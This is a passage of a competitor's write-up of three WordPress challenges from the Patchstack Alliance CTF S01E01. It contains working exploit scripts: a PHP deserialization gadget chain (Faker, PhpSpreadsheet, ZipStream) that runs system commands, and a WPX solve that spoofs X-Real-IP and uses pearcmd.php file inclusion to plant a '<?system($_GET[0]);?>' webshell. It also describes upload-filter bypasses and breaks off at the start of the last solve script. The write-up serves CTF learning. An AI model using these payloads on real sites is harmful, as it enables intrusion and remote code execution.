---
id: 14848583-e65d-80f5-a51b-fc90908e7e6b
title: Patchstack Alliance CTF S01E01
created_time: 2024-11-24T01:13:00.000Z
last_edited_time: 2025-05-23T05:37:00.000Z
cover_image: ./imgs/ctf_bz7FKxwy.png
icon_emoji: 💦
categories:
  - wordpress
verification:
  state: unverified
  verified_by: null
  date: null
page: Patchstack Alliance CTF S01E01
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/ctf_bz7FKxwy.png

---

***

![](./imgs/image_c5Oe8EOM.png)

In the recent Patchstack Alliance CTF S01E01, I am thrilled to share that I earned 2nd place and successfully solved all the challenges presented. Below is my detailed write-up of each challenge:

# Donor

## Challenge Information

Description

    You are a kind sponsor, please help me donate to help those in need.

    By: NgocAnhLe

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9024/](http://3.14.248.34:9024/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/263ee279-cc66-43f8-904e-623e0d2f3d05/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RDXR747M%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T132311Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCIFWYl4fNJv1cEe4xWmbj9Z7yy0HFab5IPsQAeVOibl36AiAchYHhiwXGZI89NqGGtZAyaxY9SbSKG%2FMMuBvlAvlMkiqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMaE7%2B8%2Bet14%2BQxakZKtwDzIa2LOY1aYX6h%2Ff%2FoJ9%2BYh3Uva1xtBrwrijS7o8SNpOMmQ8b8v6jRqdFrGyxXFldlgNlKINtBa52crp1CwM0mTp5jAJ3ZGm0ZUnpCcPNlL07vQIVswUDfF70pisPTxeMRkE5bFyfIWLv8JeSgDij6czE3mVzbSU%2Fr%2B6LE36cHOuafI%2FgP3FhcFXzjen3yvZ787yeR7kJlK5J%2BxrYP1mlJRcAuVMytiI0hjxoF1ocQH6mJwcCXknGAb2pYJiNvaHZPZbA0gFiEW4kwALiUJoJ9BHLzBncGWGKpMKeGfb8%2BeIbw2qKri25Y3cdsop6raecUpQm%2BcGLuzvw6nIJ5CbxEhTEWYEt902uefUmFIpLQ%2F3It5sM9tiBwuDE7kncsW5pr9EJm1jjVehbtXCMLEAIF71Eg1zkMGm0Q5ce%2FaF4pKBDj6sBDNICKi%2BpESc2J5b6dYfVBPXUk8Q7sUjwNdJvZ4Lwoqkeu2BDHAU1g217qC0cM%2BDcRqC%2B3a8tR7H6EKR9RjJMUy1yazNJuZ9j1ywmvQI4Ar6lDWWYAQ244jCxWJp2KTg1Vw%2FwQgCpQ5Jbi27Hs0G1%2Fb2eRhakOTdL8u5rR8olCeBMPMk%2F%2B98wpFXTTOGBqTjt1C29jPsv%2BvswmtjBwQY6pgFFDgy2tFpbCuLoTc0FnV5vM7f9UKNMtVoYN3A1Uyfbk7LLZ6qSiuBnFXOWdyDBz6Pp1y3UQ0mMTokKofGP7xsbd0jdfdcRAIxsgsnqWGKThz2yekSFqDWYfyQYk9%2Bu2%2FJbTIxKCgOiwv8To1Z5Md6zwZHXI1hH4ouhvCC6akDYEYfubY3awxLFFJteJHTEL%2B2nDCHnwPYLH5%2FnTMDjWrdohxlmhHJP&X-Amz-Signature=15452f2ed49836b86600eb12db4082bbb31ccbca6e14531110462e5f8a7042c3&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

In this challenge, we will exploit insecure deserialization in a WordPress environment. The challenge itself uses a custom plugin named "simple-donate-plugin" that is vulnerable to deserialization.

The interesting part about this challenge is that it uses Faker, which has an intriguing `__call` method. This method is invoked when a method is not found within a class, triggering the `__call` method. We will delve into this further in the write-up below.

## Reconnaissance

If we take a look at the source code, we will see that the application itself stores our `meta_value` using an update query:

```php
...snip...
    $anonymous = get_user_meta($user_id, 'anonymous', true);
        ...snip...
        $is_anonymous = isset($_POST['is_anonymous']) ? $_POST['is_anonymous'] : 0;
...snip...
if ($existing_meta_key) {
            // Update the existing meta value if the key exists
            $wpdb->update(
                $wpdb->usermeta,
                ['meta_value' => stripslashes_deep($is_anonymous)],
                ['meta_key' => $existing_meta_key]
            );
            ...snip...

```

This approach isn't secure because storing data in `meta_value` without using the `update_user_meta` function is risky. When `get_user_meta` is called, the data will get deserialized, potentially exposing the application to a deserialization exploit that can lead to remote code execution (RCE) in this case.

## Exploitation

To gain deserialization, we need to supply the `$is_anonymous` function with our deserialization payload. This gets interesting because researching the deserialization gadget requires the thoroughness of a real "Cyber Security Researcher". TL;DR, I found the gadget to gain RCE. Here's the flow:

By searching for the possible gadget in the vendor, I found a gadget chain involving a magic method `__call` that has `call_user_func` in it. This `__call` magic method is invoked when a method is not found within a class. For example, `$class->notfound` will trigger the `__call` method if the method `notfound` doesn't exist in the class. Here, we use a gadget from `fakerphp`:

challenge-custom/simple-donate-plugin/vendor/fakerphp/faker/src/Faker/ValidGenerator.php

    ```php
    ...snip...
    class ValidGenerator
    {
    ...snip...
        public function __call($name, $arguments)
        {
            $i = 0;
            do {
                $res = call_user_func_array([$this->generator, $name], $arguments);
                ++$i;

                if ($i > $this->maxRetries) {
                    throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));
                }
            } while (!call_user_func($this->validator, $res));

            return $res;
        }
     ...snip...
    ```

After identifying where we can gain RCE from the class mentioned above, we need a way to actually invoke it. I used the `__destruct` magic method to trigger it when the class gets destructed, as shown below:

challenge-custom/simple-donate-plugin/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Worksheet/Worksheet.php

    ```php
    ...snip...
    class Worksheet implements IComparable
    {
    ...snip...
        public function disconnectCells(): void
        {
            if ($this->cellCollection !== null) {
                $this->cellCollection->unsetWorksheetCells();
                // @phpstan-ignore-next-line
                $this->cellCollection = null;
            }
            //    detach ourself from the workbook, so that it can then delete this worksheet successfully
            $this->parent = null;
        }
    ...snip...
        /**
         * Code to execute when this worksheet is unset().
         */
        public function __destruct()
        {
            Calculation::getInstance($this->parent)->clearCalculationCacheForWorksheet($this->title);

            $this->disconnectCells();
            $this->rowDimensions = [];
        }
        ...snip...
    ```

    I use this method because it calls `disconnectCells`, which in turn calls `unsetWorksheetCells` and then `detach`. We supply the `currentCell` with `ValidGenerator`, so when `detach` in the line `$this->currentCell->detach();` gets called, it actually invokes the `ValidGenerator` class's `__call` method because the `detach` method isn't defined in the `ValidGenerator` class.

challenge-custom/simple-donate-plugin/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Collection/Cells.php

    ```php
    ...snip...
    class Cells
    {
    ...snip...
        public function unsetWorksheetCells(): void
        {
            if ($this->currentCell !== null) {
                $this->currentCell->detach();
                $this->currentCell = null;
                $this->currentCoordinate = null;
            }

            // Flush the cache
            $this->__destruct();

            $this->index = [];

            // detach ourself from the worksheet, so that it can then delete this object successfully
            $this->parent = null;
        }
     ...snip...
    ```

After that, we will supply the `generator` attribute in the `ValidGenerator` class with this `Stream` class. This way, when the `ValidGenerator` gets called, it will actually call the `Stream` class in this line `$res = call_user_func_array([$this->generator, $name], $arguments)`. It will call the `detach` method from the `Stream` class, allowing us to control the output of `$res` by supplying the `$this->stream` attribute.

challenge-custom/simple-donate-plugin/vendor/maennchen/zipstream-php/src/Stream.php

    ```php
    ...snip...
    class Stream implements StreamInterface
    {
     ...snip...   
        public function detach()
        {
            $result = $this->stream;
            $this->stream = null;
            return $result;
        }
    ...snip...
    ```

## Obtaining the Flag

Here's a script that i use to solves the challenge:

x.php

    ```php
    <?php

    // __destruct
    namespace PhpOffice\PhpSpreadsheet\Worksheet {
        class Worksheet
        {
                private $cellCollection;
                public function __construct($cellCollection)
                {
                    $this->cellCollection = $cellCollection;
                }
        }
    }

    // __call
    namespace Faker {
        class ValidGenerator {
            protected $generator;
            protected $validator;
            protected $maxRetries;
            public function __construct($class, $function)
            {
                $this->generator = $class;
                $this->validator = $function;
                $this->maxRetries = 10000;
            }
        }
    }

    // stored cmd
    namespace PhpOffice\PhpSpreadsheet {
        class Spreadsheet {
            private $calculationEngine;
            public function __construct($calculationEngine)
            {
                $this->calculationEngine = $calculationEngine;
            }
        }
    }

    // stored cmd 2
    namespace PhpOffice\PhpSpreadsheet\Collection {
        class Cells
        {
            private $currentCell;
            public function __construct($store)
            {
                $this->currentCell = $store;
            }
        }
    }

    namespace ZipStream {
        class Stream {
            protected $stream;

            public function __construct($stream)
            {
                $this->stream = $stream;
            }
        }
    }

    ```

test.php

    ```php
    <?php


    require_once './x.php';

    $arg = new \ZipStream\Stream("cat /f*");
    $fk = new \Faker\ValidGenerator($arg, "system");
    $cel = new \PhpOffice\PhpSpreadsheet\Collection\Cells($fk);
    $des = new \PhpOffice\PhpSpreadsheet\Worksheet\Worksheet($cel);

    $ser = serialize($des);
    $b64 = base64_encode($ser);
    echo $b64;

    ```

solve.php

    ```python
    import httpx

    URL = "http://3.14.248.34:9024"
    # URL = "http://localhost:9024"

    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.Client(base_url=url)
        def welcome_to_the_donation_form(self, is_anonymous, submit_donation, name, email, amount):
            return self.c.post("/welcome-to-the-donation-form/", data={
                "name": name,
                "email": email,
                "amount": amount,
                "is_anonymous": is_anonymous,
                "submit_donation": submit_donation,
            })
    class API(BaseAPI):
        ...

    if __name__ == "__main__":
        api = API()
        import os, base64
        payload = os.popen("php ./test.php").read()
        payload = base64.b64decode(payload.encode()).decode()
        print(payload)
        res = api.welcome_to_the_donation_form(payload, "Submit", "admin", "admin@localhost", "100")
        print(res.status_code)
        print(res.text)

        res = api.c.get("/thank-you/")
        print(res.text)

    ```

flag:

![](./imgs/image_tmpYBAo2.png)

# WPX

## Challenge Information

Description

    Hi, I'm a new developer and I'm trying to learn how to develop a WordPress plugin. I'm trying to create news plugin that can get news by date, can you help me to test it? I'm still learning and I'm not sure if it's secure enough.

    by Dimas Maulana

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9001/](http://3.14.248.34:9001/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/ced27275-e9b2-4c03-84bd-71f9ef4bdfce/attachment_%281%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666H7FOHSC%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T132316Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCID1Qy5KgTkEzMbKS83%2F5TZJFMaZNz65Ov2iriHuPu8HQAiEApmWkSku5kTsmvqJJztt7cDz%2BpNrv%2BWycDR6DNFq0EdoqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDIJUYSVYw4tc93%2Bw8yrcA%2Bz7rMQJi3QnYbB03bTz3YeeiMzdrXT7i1RMFHh8ZO%2Ba5HvL%2FTdJTr69kMb0BcdsXXDUARUAHMlESPxaIAB1PhDCy7i%2BsVUJKBNLEthhIGFV2ORsJnj80lC7HFVgZTkfpj3%2BpO2Y%2FZNYEptVDQx%2B6EEt678hZ2vdJUtj0oBq8bjIzesGUCC%2BZ%2BPYB8qVdGJfG14lbtjbZ31ajjJ3%2FoiU7y%2Fh0JtVCFuMRh40NObxsvQH4TiMSaGCcffimEH8rDnDrGMCbaDYlIq8Y6pzak7DETKCclKF9hB%2FnHXrTnc%2F8b8mRZIAXmdVYbTf%2FwSBplx%2B68AeBRTYomzL%2Bofq97zis%2F7iRUmwh3oAkDRbqCk5kW0730y%2BvQuHwGdnGbPREtqu4bfFB1A5wjeGuNold%2FWqxRhZovfSneTj44xxBce5nbXwrmKMnafPR8%2FWmkrxWnNKGG3Jzz8mgkKz0HGnYRpXKMGsdIsLJuAk%2BVc%2FB9an78au%2FUEov55c3ON5Jytf4Oe5GEx46MdMV7jOvSDgKpm14rWkn1IeGmgNkC9m1NXOgkc4arkU%2BWNzjdmTUm9xF4GvCLSD4kA7eLEXF9FQTnSGhRDFEXN2H8mva%2FpTMPh%2FpLtyVd%2BRmHxPXAdncr7ZMInYwcEGOqUBNASCDbPsFv5WGfcT8PkRIR5zUSNodJDcTGtUp3sB%2BAQUzmdAK8WGb2eieHQVoR%2BzSZfgm7fMpZalDkK3Yjn0t6zpWbXKVo%2F4rEJ%2F8g%2BCvgo8SSORpY%2BcwgRcPjhzVqgCeEbz49zfE6sKfiXeDp8IJTFnK87vHg8nyIBuPnkuhmfZsUuKC64i4hJjUMV36Md1I3YsrwfGy36PZZS4KljbHxR2Vahc&X-Amz-Signature=a23d76ec818bd1d5c40ebacc1025c07466a920fc400438bfe1e976e564ef190b&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

In this challenge, we will exploit four kinds of vulnerabilities. The first is the improper handling of `REMOTE_ADDR` parameters in the Nginx configuration, which allows us to bypass the `REMOTE_ADDR` check. The second vulnerability is the `preg_match` capture limit; when we use `(...)` in `preg_match`, the match is stored, and if it exceeds the limit, it returns false. The third vulnerability involves bypassing `date` function formatting, and the last one is a restricted local file inclusion that only allows `.php` files, which we can exploit to achieve Remote Code Execution (RCE).

## Reconnaissance

Apparently, the Docker setup uses PHP-FPM and Nginx to serve the server, and we get a configuration like this:

server/nginx/nginx.conf

    ```plain text
    # generated by ChatGPT
    server {
        listen 80;
        server_name localhost;

        root /var/www/html;
        index index.php index.html index.htm;

        # Access and error log files
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        # Directory permissions and options
        location / {
            try_files $uri $uri/ /index.php?$args;
        }

        # PHP-FPM configuration for processing PHP files
        location ~ \.php$ {
            include fastcgi_params;
            fastcgi_pass wp_service_1:9000;     # Reference to PHP-FPM container and port
            fastcgi_index index.php;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param REMOTE_ADDR $http_x_real_ip;
        }

        # Disable access to .htaccess and other sensitive files
        location ~ /\.ht {
            deny all;
        }

        # Static files caching
        location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
            expires 30d;
            access_log off;
        }
    }
    ```

There is also a custom plugin named `custom` that has multiple vulnerabilities in it.

custom.php

    ```php
    <?php
    /**
     * @package Custom Plugin
     */
    /*
    Plugin Name: Custom Plugin
    */

    add_action('wp_ajax_news', 'news');
    add_action('wp_ajax_nopriv_news', 'news');

    add_action('wp_ajax_login', 'login');
    add_action('wp_ajax_nopriv_login', 'login');

    function login() {
        if (!isset($_POST['username'])) {
            echo "Username and password are required";
            die();
        }

        if (is_array($_POST['username'])) {
            echo "Username and password cannot be an array";
            die();
        }

        if (preg_match('/(admin)+/s', $_POST['username'])) {
            echo "Username cannot contain 'admin'";
            die();
        }

        session_start();

        $_SESSION['username'] = $_POST['username'];

        echo "Login success";

        die();
    }

    function news() {
        if (!isset($_POST['date'])) {
            echo "Date is required";
            die();
        }

        if (is_array($_POST['date'])) {
            echo "Date cannot be an array";
            die();
        }

        // only allow admin to access this ajax
        $wp_service_1_bot = gethostbyname('localhost');
        if ($_SERVER['REMOTE_ADDR'] !== $wp_service_1_bot) {
            echo "Only admin can access this ajax";
            die();
        }

        // check session
        session_start();
        if (!isset($_SESSION['username'])) {
            echo "You need to login first";
            die();
        }

        if (strpos($_SESSION['username'], 'admin') === false) {
            echo "Only admin can access this ajax";
            die();
        }

        // example date format d-m-y
        $date = stripslashes($_POST['date']);

        header("Content-Security-Policy: default-src 'none';");
        include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/custom/date/' . date($date) . '.php');
        die();
    }
    ?>

    ```

## Exploitation

To exploit this challenge, we first need to bypass the `REMOTE_ADDR` check below by adding a header like this: `X-Real-IP: 127.0.0.1`. This works because Nginx is configured to pass `fastcgi_param REMOTE_ADDR $http_x_real_ip;` to PHP-FPM, which sets the `REMOTE_ADDR` to the value of the `X-Real-IP` header.

```php
    $wp_service_1_bot = gethostbyname('localhost');
    if ($_SERVER['REMOTE_ADDR'] !== $wp_service_1_bot) {
        echo "Only admin can access this ajax";
        die();
    }
```

Once we bypass the `date` and `preg_match` limitations as previously explained, the next step involves using the `pearcmd.php` technique to perform a file upload. After successfully uploading our file, we can then include our uploaded file using the `include` function to achieve Remote Code Execution (RCE).

## Obtaining the Flag

Here is my solve script to solve this challenge:

```python
import httpx
import asyncio
import re
from subprocess import check_output
URL = "http://3.14.248.34:9001/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

    def login(self):
        return self.c.post("/wp-admin/admin-ajax.php", data={
            "action": "login",
            # bypass preg_match('/(admin)+/s', $_POST['username'])
            "username": "admin"*9000,
        })
    def upload_shell(self):
        # bypass date
        lfi = r"../../../../../../../../../../../\u\s\r/\l\o\c\a\l/\l\i\b/\p\h\p/\p\e\a\r\c\m\d"
        sessid = self.c.cookies.get("PHPSESSID")
        return check_output([
            'curl',
            '-X', 'POST', URL + f'''wp-admin/admin-ajax.php?+-c+/tmp/foo.php+-d+man_dir=<?system($_GET\\[0\\]);?>+-s+''',
            '-d', f'action=news&date={lfi}',
            '-H', 'X-Real-IP: 127.0.0.1',
            '-H', f'Cookie: PHPSESSID={sessid}'
        ])

    async def get_flag(self):
        res = await self.c.post(f"wp-admin/admin-ajax.php", data={
            "action": "news",
            # bypass date
            "date": r"../../../../../../../../\t\m\p/\f\o\o"
        }, headers={
            "X-Real-IP": "127.0.0.1"
        }, params={
            "0": "/readflag && rm /tmp/foo.php"
        })
        flag = re.search(r"CTF\{.*\}", res.text).group()
        return flag


class API(BaseAPI):
    ...

async def main():
    api = API()
    res = await api.login()
    # print(res.text)
    res = api.upload_shell()
    # print(res)
    res = await api.get_flag()
    print(res)

if __name__ == "__main__":
    asyncio.run(main())
```

Flag:

![](./imgs/image_Kca7xLKp.png)

# Emojifuscation

## Challenge Information

Description

    can you guess the emoji

    by stealthcopter

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

    [http://3.14.248.34:9019](http://3.14.248.34:9019/)

Attachment

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/61abaced-81c5-4083-aa28-a13bd45ef641/attachment_%282%29.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QFOIXR5C%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T132317Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQC8PfqU%2FvoAOk14PO2tCaF1sB87OeYzv8IrestUFPaOCwIgMMD7ocgUfCA0MK%2FwLIVQ6jdava6IAasdDIZZmD01lrsqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDH7SQuHAV0siUhMrryrcAywCql1Y8EqnIvlPoiFruGNFwD%2BJpM0KmNE0Hqpv3YDuHaTzQA2yY5X6C1Aw%2F8l80kz2IaVQ8qzW7xJFGgUqNfJTaP3lyX447UzvHcTXHuWF2HZVQYLaAO9RQS4P%2FbuU0qfi8lL1YHajxeDuzmZ01O9NrOkafFCsb4okUarYCYYOIGUomAxUJbttAvGITYKZ6j37R0s14wudhhIKRb0f6zyn3pGZwVR3BNCoVkM7VlQxkGif4bj7FmmQrtZAgZpfUghnSufon2F9%2BTGwyjwbq2NHvWezBF3iL3iRv6B6bj4wE%2BtryXOIP%2Fe3LJWfxJ2mTrg44loa85%2F2A6LmYc1AF7z8wWAej%2BW1n%2BbHQ%2BoRVl4qHRjc%2BOH25XbFVRZa9e%2F2ml11VCkdssY8XMTsVvJl5pMgqN68FK31G0a5n0dOItJ8tLcvdCDIcg6J5AZ3%2B25GC433xE61W7jOeow225MXYrhWzSkqxjTJ%2BKO4lbjILHJBRFW%2BXseqihCio19Yuqq1d6qGepMtkTL6WFz%2BZT%2FwOjDnaA%2FisocnvepMgpnyBxpsaPJCr3cZ5Zg2tFNiZXKkNXSubtzaPego82IrnjZ3jGCfd73Yh6H5d3LF9YwZTTsdlyqLRFVvBIQUnrepMJ3YwcEGOqUBnM2QJZisdNN1DMHub9%2BBO39VPqckS5sAZsJiv4WuSG2cFnaTC4t1v94mnLuYEoiA0TIE5Q1BzIhMLGNHPafSfboypWbFuCT0S5bhU1S%2BExs4DAbFXhsU4omI1B4zbWX85LSbf%2BO4S5TD3T2WEHXLqpjLEnl80N8U6evWMhknjw8iveQ9NqDBPpiD31lRJTN40mZa9J6R4wqgdr2M4XISq97frpA%2F&X-Amz-Signature=c03ad791ad024a03c8cde61132da6cad1dbf20578c2e5859112eb93f72b542cd&X-Amz-SignedHeaders=host&x-id=GetObject)

## Understanding the Challenge

This challenge involves a peculiar emoji encoding mechanism so we need to decode it first to read the source code. The primary vulnerabilities here include arbitrary file write and bypassing extension checks to upload a PHP extension file.

## Reconnaissance

I actually just throw all the source code into microsoft copilot to decode the source code, and i get this as a result:

Emoji mapping and some function

    ```php
    <?php

    /*
     * Comments and explanations here
     * 
     * */

    function replace_and_define($emoji, $replacement) {
        return define($emoji, $replacement);
    }

    replace_and_define('🕳️', '');
    replace_and_define('🌌', ' ');
    replace_and_define('🧨', 'explode');

    $emoji_string = '_ 👀 🗯️ 👻 🏠 🪨 🖼️';

    $emoji_array = [
        '⚀' => 1,
        '🐘' => '.php',
        '🧬' => 'urlencode',
        '🤯' => 'implode',
        '🚰' => 'filter',
        '➕' => 'add',
        '🧼' => 'sanitize_text_field',
        '🚿' => 'sanitize_file_name',
        '🗡️' => '/',
        '👤' => 'user_login',
        '🔑' => 'user_pass',
        '📛' => 'name',
        '♻️📛' => 'tmp_name',
        '🥇' => 'first_name',
        '🏁' => 'last_name',
        '🔍👤' => 'get_user_meta',
        '🔄👤' => 'update_user_meta',
        '👤✅' => 'is_user_logged_in',
        '👤🔍' => 'wp_get_current_user',
        '🔍🧩' => 'in_array',
        '🧩🔢' => 'array',
        '🔄🎲' => 'array_rand',
        '⚠️❌' => 'WP_Error',
        '🔡' => 'strtolower',
        '📩' => 'wp_insert_user',
        '🛌' => 'rest_ensure_response',
        '📥' => 'GET',
        '✉️' => 'POST',
        '📸' => 'jpg',
        '📸🇪📸' => 'jpeg',
        '🏞️' => 'png',
        '🏞️📸' => 'image/jpeg',
        '🏞️🖼️' => 'image/png',
        '🗂️🧪' => 'mime_content_type',
        '🚛🆙🗄️' => 'move_uploaded_file',
        '🥪' => 'add_action',
        '🛌🟢' => 'rest_api_init',
        '🥱' => 'register_rest_route',
        '🧩' => 'methods',
        '📂⁉️' => 'is_dir',
        '📝⁉️' => 'file_exists',
        '📂‼️' => 'mkdir',
        '☎️' => 'callback',
        '🗃️' => '_FILES',
        '🤙' => 'permission_callback',
        '🪃💯' => '__return_true',
        '💯' => true,
        '🔸' => '.',
        '🧵' => 'str_replace',
        '🪪' => 'htaccess',
        '📏' => 'constant',
        '🪹' => 'is_empty',
        '🫥' => 'copy',
        '🏰📂' => 'basedir',
        '📤🗂️' => 'wp_upload_dir',
        '🚨️⁉️' => 'is_wp_error',
        '🗂️📋' => 'dirname',
        '🗺️' => 'map',
        '👔📜' => 'admin_enqueue_scripts',
        '🚀📜' => 'wp_enqueue_script',
        '🏰🔗' => 'baseurl',
        '🙉' => 'base64_decode',
        '🙈' => 'U2xCRFpteE1WSGR1TlVObVNVUXdaMGwyUTJac1RGUjNialZEWmtscWN6MD0=',
    ];

    foreach (explode(' ', $emoji_string) as $emoji) {
        $emoji_array[$emoji] = $emoji;
    }

    foreach ($emoji_array as $key => $value) {
        define($key, $value);
    }

    function upload_directory(){
        $dir = wp_upload_dir()['basedir'] . '/uploads';
        if (!file_exists($dir)) {
            mkdir($dir);
            // Add .htaccess file to the directory
            copy(dirname(__FILE__) . '/.htaccess', $dir . '/.htaccess');
        }
        return $dir;
    }

    function upload_url($filename){
        return wp_upload_dir()['baseurl'] . '/uploads' . str_replace(upload_directory(), '', $filename);
    }

    function implode_strings(...$parts) {
        return implode('', $parts);
    }

    function urlencoded_strings(...$parts) {
        return implode('/', array_map('urlencode', $parts));
    }

    function check_for_error($object) {
        return is_wp_error($object);
    }

    function get_param($request, $param){
        return $request->get_param($param);
    }

    function is_user_logged_in() {
        return is_user_logged_in();
    }

    function random_emoji() {
        $emojis = explode(' ', "🤣 🥳 🤩 🤔 🤖 👻 👽 🦄 🐶 🐸 🦊 🦁");
        return $emojis[array_rand($emojis)];
    }

    function return_error($code, $message){
        return new WP_Error($code, $message);
    }

    function get_global($name){
        return $GLOBALS[$name];
    }

    function current_user_id(){
        return wp_get_current_user()->ID;
    }

    ```

Main

    ```php
    <?php
    /**
     * Plugin Name: Example Plugin
     * Plugin URI: https://example.com
     * Description: This plugin does something interesting.
     * Version: 1.4.2
     * Author: Author Name
     * Author URI: https://authorwebsite.com
     */

    define('DEFINE_CONSTANT', 'define');

    include 'config.php';
    include 'init.php';

    add_filter('template_include', 'custom_template_include');

    function custom_template_include() {
        include 'header.php';
        print <<< EOT
    Hello world! Welcome to our plugin<br><br>
    We hope you find it useful.<br><br>
    This plugin connects to external APIs<br><br>
    Are you ready to get started?
    EOT;
        include 'footer.php';
    }

    add_action('admin_enqueue_scripts', function() {
        wp_enqueue_script('wp-api');
    });

    ```

API

    ```php
    <?php

    add_action('rest_api_init', function () {

        $route = urlencode(home_url());

        register_rest_route($route, '/' . urlencode('endpoint1'), [
            'methods' => 'GET',
            'callback' => 'callback1',
            'permission_callback' => '__return_true',
        ]);

        register_rest_route($route, '/' . urlencode('endpoint2'), [
            'methods' => 'POST',
            'callback' => 'callback2',
            'permission_callback' => '__return_true',
        ]);

        register_rest_route($route, '/' . urlencode('endpoint3'), [
            'methods' => 'POST',
            'callback' => 'callback3',
            'permission_callback' => 'current_user_can_access',
        ]);
    });

    function callback1() {
        // phpcs:ignore -- ignoring coding standards check
        eval(base64_decode(base64_decode(base64_decode('U2xCRFpteE1WSGR1TlVObVNVUXdaMGwyUTJac1RGUjNialZEWmtscWN6MD0='))));
        $response = [
            'callback1' =>  $some_variable,
        ];
        return rest_ensure_response($response);
    }

    function callback2($request)
    {
        $data = [];

        foreach (explode(' ', "user_login user_pass first_name last_name") as $field) {
            $data[constant($field)] = sanitize_text_field($request->get_param($field));
        }

        $user_id = wp_insert_user($data);

        if (is_wp_error($user_id)) {
            return $user_id;
        }

        return rest_ensure_response([
            'status' => 'success',
            'user_id' => $user_id,
        ]);
    }

    function callback3($request){
        $user_id = get_current_user_id();
        $first_name = get_user_meta($user_id, 'first_name', true);
        $last_name = get_user_meta($user_id, 'last_name', true);

        if (!empty($_FILES['image'])) {
            $file = $_FILES['image'];
            $filename = random_emoji() . random_emoji() . random_emoji() . '_' . sanitize_file_name($file['name']);
            $tmp_name = $file['tmp_name'];

            $allowed_ext = ['jpg', 'jpeg', 'png'];

            if (!in_array(strtolower(explode('.', $filename)[1]), $allowed_ext)) {
                return new WP_Error('error', 'File type not allowed: ' . implode(',', $allowed_ext));
            }

            $mime_type = mime_content_type($tmp_name);

            if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
                return new WP_Error('error', 'Invalid file type!');
            }

            $upload_dir = upload_directory() . '/' . $first_name . '_' . $last_name;

            // Clean directory path
            $upload_dir = str_replace('./../', '', $upload_dir);

            $file_path = $upload_dir . '/' . $filename;

            if (!is_dir($upload_dir)) {
                mkdir($upload_dir);
            }

            if (!move_uploaded_file($tmp_name, $file_path)) {
                return new WP_Error('error', 'Failed to upload file');
            }

            $file_url = upload_url($file_path);
            update_user_meta($user_id, 'image', $file_url);
        }

        return rest_ensure_response([
            'status' => 'success',
            'user_id' => $user_id,
            'image' => $file_url,
        ]);
    }
    ```

## Exploitation

So to exploit this challenge we need to gain RCE by using this file upload.

```php
        if (!move_uploaded_file($tmp_name, $file_path)) {
            return new WP_Error('error', 'Failed to upload file');
        }
```

but we must bypass some waff in it

```php
        $allowed_ext = ['jpg', 'jpeg', 'png'];

        if (!in_array(strtolower(explode('.', $filename)[1]), $allowed_ext)) {
            return new WP_Error('error', 'File type not allowed: ' . implode(',', $allowed_ext));
        }

        $mime_type = mime_content_type($tmp_name);

        if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
            return new WP_Error('error', 'Invalid file type!');
        }

        $upload_dir = upload_directory() . '/' . $first_name . '_' . $last_name;

        // Clean directory path
        $upload_dir = str_replace('./../', '', $upload_dir);

```

The `!in_array(strtolower(explode('.', $filename)[1]), $allowed_ext)` check can be bypassed by appending a `.jpg` extension to the file name, like this: `shell.jpg.php`. This works because the check only validates the first extension and not the last.

For `!in_array($mime_type, ['image/jpeg', 'image/png'])`, you can add JPEG or PNG magic bytes at the beginning of the file to trick `mime_content_type` into recognizing it as an image file. This way, the file will pass the MIME type validation even though it contains PHP code.

## Obtaining the Flag

Here is my solve script to solve this challenge:

```python
import httpx
import asyncio
import re
import random

